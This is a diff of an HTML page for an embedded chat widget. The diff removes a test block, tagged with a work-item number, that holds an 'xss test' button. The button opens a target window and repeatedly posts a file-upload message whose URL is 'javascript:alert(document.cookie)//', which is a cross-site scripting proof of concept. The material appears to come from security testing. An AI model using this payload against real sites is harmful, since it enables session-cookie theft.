@@ -24,38 +24,6 @@
 			}
 		</style> -->
 
-		<!-- W-10118745 -->
-		<script>
-			const fireEvent = () => {
-// 				var child = window.open(new URLSearchParams(location.search).get('target'));
-
-// 				window.setTimeout(
-// 					() => {
-// 						child.postMessage(
-// 							{
-// 								method: 'liveagent.fileTransfer.uploadFile', 
-// 								data: {
-// 								url: 'javascript:alert(document.cookie)//'
-// 							}
-// 						}, '*');
-// 					},
-// 					1000
-// 				);
-
-				var child = window.open(new URLSearchParams(location.search).get('target'))
-				setInterval(()=> {
-					child.postMessage({
-						method: 'liveagent.fileTransfer.uploadFile', 
-						data: {
-							url: 'javascript:alert(document.cookie)//'
-						}
-					}, '*');
-				}, 1000);
-			};
-		</script>
-		<button id="xssTest" onclick="fireEvent()">xss test</button>
-		<!-- W-10118745 -->
-
 		<style type='text/css'>
 			.embeddedServiceHelpButton .helpButton .uiButton {
 				background-color: #167B45;
